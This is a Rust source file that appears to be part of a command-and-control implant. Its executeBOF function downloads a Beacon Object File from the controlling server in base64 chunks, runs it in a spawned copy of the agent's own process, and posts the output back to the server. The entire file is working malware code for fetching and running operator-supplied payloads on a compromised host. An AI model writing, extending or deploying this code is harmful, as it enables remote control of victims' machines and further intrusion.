use serde::Deserialize;
use serde_json::{Value, json};
use base64::engine::general_purpose;
use base64::Engine;
use std::io::Write;
const CHUNK_SIZE: usize = 4096;

#[derive(Deserialize)]
struct UploadParams {
    file_id: String,
    parameters: String,
}

pub fn executeBOF(task: &Value) -> Result<(), Box<dyn std::error::Error>> {
    // 1. Extract fields
    let id = task.get("id").and_then(Value::as_str).ok_or("Missing `id`")?;
    let raw = task.get("parameters").and_then(Value::as_str).ok_or("Missing `parameters`")?;
    let params: UploadParams = serde_json::from_str(raw)?;
    let file_id = &params.file_id;

    // 2. Download chunks into buffer
    let mut file_bytes = Vec::new();
    let mut chunk_num = 1;
    let mut total_chunks = 1;

    while chunk_num <= total_chunks {
        let payload = json!({
            "action": "post_response",
            "responses": [{
                "upload": {
                    "chunk_size": CHUNK_SIZE,
                    "file_id": file_id,
                    "chunk_num": chunk_num,
                },
                "task_id": id
            }]
        })
        .to_string();
        let resp: Value = crate::transport::send_request_with_response(&payload)?;
        let entry = &resp["responses"][0];
        total_chunks = entry["total_chunks"].as_u64().ok_or("Bad `total_chunks`")? as usize;
        let chunk_data = entry["chunk_data"].as_str().ok_or("Missing `chunk_data`")?;
        let bytes = general_purpose::STANDARD.decode(chunk_data)?;
        file_bytes.extend_from_slice(&bytes);
        chunk_num += 1;
    }

    // 3. Spawn self as isolated worker process so a crash/exit in the
    //    BOF doesn't take down the agent.
    let exe = std::env::current_exe()?;
    let worker_input = json!({
        "file_bytes": general_purpose::STANDARD.encode(&file_bytes),
        "parameters": params.parameters
    })
    .to_string();

    let mut child = std::process::Command::new(&exe)
        .arg("--worker-bof")
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()?;

    if let Some(mut stdin) = child.stdin.take() {
        stdin.write_all(worker_input.as_bytes())?;
    }

    let child_output = child.wait_with_output()?;

    let (output, status) = if child_output.status.success() {
        (String::from_utf8_lossy(&child_output.stdout).to_string(), "success")
    } else {
        let stderr = String::from_utf8_lossy(&child_output.stderr);
        let stdout = String::from_utf8_lossy(&child_output.stdout);
        let msg = format!(
            "BOF worker exited with code {:?}{}{}",
            child_output.status.code(),
            if !stdout.is_empty() { format!("\nstdout: {}", stdout) } else { String::new() },
            if !stderr.is_empty() { format!("\nstderr: {}", stderr) } else { String::new() }
        );
        (msg, "error")
    };

    // 4. Send final response
    let done = json!({
        "action": "post_response",
        "responses": [{
            "task_id": id,
            "user_output": output,
            "agent_file_id": file_id,
            "status": status
        }]
    })
    .to_string();
    crate::transport::send_request(&done)?;
    Ok(())
}
